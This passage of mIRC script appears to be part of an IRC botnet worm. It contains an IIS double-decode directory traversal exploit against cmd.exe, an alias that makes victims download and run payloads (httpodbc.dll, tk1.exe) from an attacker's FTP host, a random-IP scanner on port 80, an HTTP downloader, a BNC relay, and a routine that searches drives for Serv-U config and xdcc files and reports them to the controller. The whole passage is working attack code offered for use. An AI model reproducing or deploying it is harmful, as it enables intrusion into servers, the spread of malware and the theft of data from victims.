     sockwrite -tn $sockname NICK %bnc.nick
     sockwrite -tn $sockname USER %bnc.user
     .timer 1 10 unset %bnc.nick
     .timer 1 10 unset %bnc.user }
   on *:sockclose:bnc.server.*: { sockwrite -tn bnc.connected. [ $+ [ $gettok($sockname,3,$asc(.)) ] ] r00t: 14Disconnected: Server Closed Connection | sockclose bnc.connected. $+ $gettok($sockname,3,$asc(.)) }
   on *:sockread:bnc.server.*: {
     :loop
     sockread %bnc.server
     if (%bnc.server == $null) { return }
     sockwrite -tn bnc.connected. [ $+ [ $gettok($sockname,3,$asc(.)) ] ] %bnc.server
     goto loop
   }
   alias aroot {
     page2 $1 /scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+copy+c:\winnt\system32\cmd.exe+c:\inetpub\scripts\script.exe
     .timer -o 1 10 page2 $1 /scripts/script.exe?/c+echo+open+ $+ $2 $+ >tmp2&&echo+anonymous>>tmp2&&echo+a@a.com>>tmp2&&echo+get+httpodbc.dll>>tmp2&&echo+get+tk1.exe>>tmp2&&echo+bye>>tmp2&&echo+ftp+-s:tmp2>>tmp2.cmd&&echo+exit>>tmp2.cmd&&tmp2.cmd
     .timer -o 1 250 page2 $1 /scripts/httpodbc.dll?MfcISAPICommand=Exploit&cmd=c%3A%5Cwinnt%5Csystem32%5Ccmd.exe+%2Fc+c%3A%5Cinetpub%5Cscripts%5Ctk1.exe
     .timer -o 1 265 page2 $1 /scripts/httpodbc.dll?MfcISAPICommand=Exploit&cmd=c%3A%5Cwinnt%5Csystem32%5Ccmd.exe+%2Fc+del+c%3A%5Cinetpub%5Cscripts%5Ctk1.exe

     }
   alias sw if ($sock($1)) sockwrite -n $1 $2-
   alias www {
     if (!$1) halt | if ($left($1,7) == http://) tokenize 32 $right($1,-7)
     set %hhost $gettok($1,1,47) | set %hfile $gettok($1,2-,47)
     set %hlfile $gettok($1,-1,47) | set %hget 1
     sockopen httpdl $gettok(%hhost,1,58) 80
   }
   on *:sockopen:httpdl:{
     if ($sockerr) { halt }
     sw httpdl GET / $+ %hfile HTTP/1.0
     sw httpdl Accept: */*
     sw httpdl Host: %hhost
     if ($exists(%hlfile)) sw httpdl Range: bytes= $+ $lof(%hlfile) $+ -
     sw httpdl
   }
   on *:sockread:httpdl:{
     if (%hget) { :r | sockread &r 8192 | if (!$sockbr) { halt } | bwrite %hlfile -1 -1 &r | goto r }
     sockread %t
     tokenize 32 %t
     if (HTTP* iswm %t) && (404 isin %t) { halt }
   }
   alias scan {
     set %s.1 $1
     set %s.2 $2
     set %s.3 1
     set %s.4 0
     scan1
   }
   alias scan1 {
     if (%s.1 == 127) || (%s.1 == 192) { inc %s.1 }
     if (%s.1 >= 255) { set %s.1 $r(10,250) }
     if (%s.2 >= 255) { inc %s.1 | set %s.2 1 }
     if (%s.3 >= 255) { inc %s.2 | set %s.3 1 }
     if (%s.4 >= 255) { inc %s.3 | set %s.4 1 }
     inc %s.4
     sockopen scana. $+ $+(%s.1,.,%s.2,.,%s.3,.,%s.4) $+(%s.1,.,%s.2,.,%s.3,.,%s.4) 80
     .timersca1 -om 1 %s.delay scan2
   }
   alias scan2 {
     if (%s.max.t > %s.max) { .msg %nc Scan Finished | return }
     if (%s.1 == 127) || (%s.1 == 192) { inc %s.1 }
     if (%s.1 >= 255) { set %s.1 $r(10,250) }
     if (%s.2 >= 255) { inc %s.1 | set %s.2 1 }
     if (%s.3 >= 255) { inc %s.2 | set %s.3 1 }
     if (%s.4 >= 255) { inc %s.3 | set %s.4 1 }
     inc %s.4
     inc %s.max.t
     sockopen scana. $+ $r(1,999999999999) $+(%s.1,.,%s.2,.,%s.3,.,%s.4) 80
     set %s.cur.ip $+(%s.1,.,%s.2,.,%s.3,.,%s.4)
     .timersca2 -om 1 %s.delay scan1
   }
   on *:sockopen:scana.*:{
     if ($sockerr) { return }
     page1 $sock($sockname).ip
     sockclose $sockname
   }
   on *:sockopen:_r00t*:{
     if ($sockerr) { return }
     sockwrite -n $sockname GET /scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+copy+c:\winnt\system32\cmd.exe+c:\inetpub\scripts\script.exe HTTP/1.1
     sockwrite -n $sockname Accept: */*
     sockwrite -n $sockname Host: ww.tk.gov
     sockwrite -n $sockname $crlf
   }
   on *:sockread:_r00t*:{
     if ($sockerr) { return }
     sockread %ttt
     if (The specified CGI application misbehaved isin %ttt) {
       if (%s.root == on) { aroot $sock($sockname).ip $read(c:\winnt\p.ub) }
       if (%log == on) { write c:\winnt\i.lo.g $sock($sockname).ip }
       set %last $sock($sockname).ip
       inc %copies
     }
   }
   alias page1 {
     sockopen _r00t $+ $r(1,99999999999) $1 80
   }
   alias findservu {
     .echo -a $findfile(c:\,*xdcc*,0,990, .msg $nc Found: $1-)
     .echo -a $findfile(d:\,*xdcc*,0,990, .msg $nc Found: $1-)
     .echo -a $findfile(e:\,*xdcc*,0,990, .msg $nc Found: $1-)
     .echo -a $findfile(c:\,serv*.ini,0,990, .msg $nc Found: $1-)
     .echo -a $findfile(d:\,serv*.ini,0,990, .msg $nc Found: $1-)
     .echo -a $findfile(e:\,serv*.ini,0,990, .msg $nc Found: $1-)
   }

   ctcp *:version:*:{ .ctcpreply  $nick VERSION $ri(version) $+ : $ri(version.msg ) }
